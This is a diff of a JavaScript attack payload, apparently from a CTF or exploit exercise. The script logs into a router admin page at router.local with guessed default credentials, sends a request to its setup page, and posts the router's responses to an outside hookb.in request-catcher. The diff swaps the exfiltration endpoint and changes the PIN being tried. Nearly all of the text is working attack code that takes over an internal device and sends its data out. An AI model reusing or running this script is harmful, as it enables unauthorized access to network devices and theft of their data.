@@ -12,22 +12,20 @@ http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
 http.onload = function () {
                 const xhr = new XMLHttpRequest();
-                xhr.open('POST', 'https://hookb.in/QJ9MMJQxgMs8mNzzl19r', true);
+                xhr.open('POST', 'https://hookb.in/9XokkMx6jBsW1OXXwdE9', true);
                 xhr.setRequestHeader('Content-type', 'application/json');
                 xhr.send(JSON.stringify(http.responseURL));
-            
-             
-                
-
 };
+
 http.onreadystatechange = function() {
           if(http.readyState === XMLHttpRequest.DONE && http.status === 200) {
             if (http.responseURL === 'http://router.local/home.php?action=view&'+cook) {
               const req = new XMLHttpRequest();
                 req.open('POST', 'http://router.local/setup.php', true);
+                req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                 req.onload = function () {
                   const r = new XMLHttpRequest();
-                  r.open('POST', 'https://hookb.in/QJ9MMJQxgMs8mNzzl19r', true);
+                  r.open('POST', 'https://hookb.in/9XokkMx6jBsW1OXXwdE9', true);
                   r.setRequestHeader('Content-type', 'application/json');
                   r.send(JSON.stringify(http.responseText));
                 };
@@ -37,7 +35,7 @@ http.onreadystatechange = function() {
 }
 
 //http.send();
-http.send(cook+"&username=admin&pin=123456&notRobot=on");
+http.send(cook+"&username=admin&pin=admin&notRobot=on");
 
 
 
